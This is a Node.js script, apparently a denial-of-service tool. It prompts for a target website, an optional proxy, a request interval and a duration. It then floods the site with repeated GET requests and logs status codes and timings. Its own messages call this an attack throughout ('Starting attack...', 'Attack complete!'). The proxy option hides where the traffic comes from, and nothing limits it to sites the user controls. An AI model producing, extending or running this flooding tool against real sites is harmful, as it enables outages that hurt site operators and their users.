const prompt = require('prompt-sync')({sigint: true});
const {HttpsProxyAgent} = require("https-proxy-agent")

function cs(color) {
    const colors = {
        reset: "0",
        black: "90",
        red: "91",
        green: "92",
        magenta: "95",
        yellow: "93",
        blue: "94"
    };
    return "\x1b[" + (colors?.[color] ?? "0") + "m";
}

function nl() {
    console.log()
}
(async() => {
    const interval = parseInt( prompt(`${cs("red")}Set interval (default: 20) ${cs("green")} `))  || 20
    console.log(`${cs("magenta")}${interval}${cs("reset")}`)

    const sitePrompt = prompt(`${cs("red")}Set site ${cs("green")}`)
    const site = `${sitePrompt.startsWith("https://") ? "" : "https://"}${sitePrompt}${sitePrompt.endsWith("/") ? "" : "/"}`
    console.log(`${cs("magenta")}${site}${cs("reset")}`)

    const proxyPrompt = prompt(`${cs("red")}Set proxy, include port (default: None) ${cs("green")}`) || null
    const proxy = proxyPrompt ? `${proxyPrompt.startsWith("https://") ? "" : "https://"}${proxyPrompt}` : null
    console.log(`${cs("magenta")}${proxy ? proxy : "None"}${cs("reset")}`)

    const length = parseFloat(prompt(`${cs("red")}Set length in seconds (default: 60)${cs("green")} `)) || 60

    if ((prompt(`${cs("red")}! ARE YOU SURE YOU WANT TO CONTINUE? !${cs("green")} `) || "yes") !== "yes") {
        console.log(cs("reset"))
        process.exit(0)
    }

    

    console.clear()
    const agent = new HttpsProxyAgent(proxy || "https://1.1.1.1:80") //proxy is never used if theres no proxy set, so random value
    console.log(`${cs("yellow")}! TESTING SITE AND PROXY ! ${cs("reset")}`)

    nl()
    
    let testRes

    try {
        testRes = await fetch(site, proxy ? { agent } : {})
    } catch(e) {
        console.log(`${cs("red")}! FATAL FETCH ERROR, CHECK CONF: ${e} !${cs("reset")}`)
        process.exit(1)
    }
    

    if (!testRes.ok) {
        console.log(`${cs("red")}! SITE RETURNED NON-OK STATUS CODE: ${testRes.status} !\n`)
        if ((prompt(`${cs("red")}Continue with attack? `) || "yes") !== "yes") {
            console.log(cs("reset"))
            process.exit(0)
        }
    }
    console.log(`${cs("green")}GET ${cs("magenta")}${site} ${cs("yellow")}${testRes.status} ${testRes.statusText} ${cs("red")}Proxy: ${proxy ? proxy : "None"}\n\n${cs("blue")}${(await testRes.text()).slice(0,50)}...\n\n`)
    
    console.log(`${cs("green")}! Starting attack...`)
    console.log("Stop at any moment with Ctrl+C.")
    setTimeout(()=>{
        console.clear()
        const startTime = new Date().getTime()
        let requests = 0
        const pendingRequests = new Set();

        const newInterval = setInterval(()=>{
            let lastReq = new Date().getTime()
            requests += 1

            const fetchPromise = fetch(site, proxy ? { agent } : {}).then(res=>{
                const lapsed = new Date().getTime() - lastReq
                
                const seconds = Math.floor((Date.now() - startTime) / 1000);
                const minutes = Math.floor(seconds / 60);
                const remainingSeconds = seconds % 60;
                const timeString = `${minutes}:${remainingSeconds.toString().padStart(2, '0')}`;

                
                console.log(`${res.ok ? cs("reset") : cs("red")}${res.status}, ${timeString}, ${cs("reset")}${requests} requests, ${lapsed}ms`)
            })
            pendingRequests.add(fetchPromise)
        }, interval)
        
        setTimeout(async()=>{
            clearInterval(newInterval)
            await Promise.all(pendingRequests)
            console.log(`${cs("green")}Attack complete!\n${requests} requests in ${length} seconds.${cs("reset")}`)
        }, length*1000)
    }, 3500)

    
})()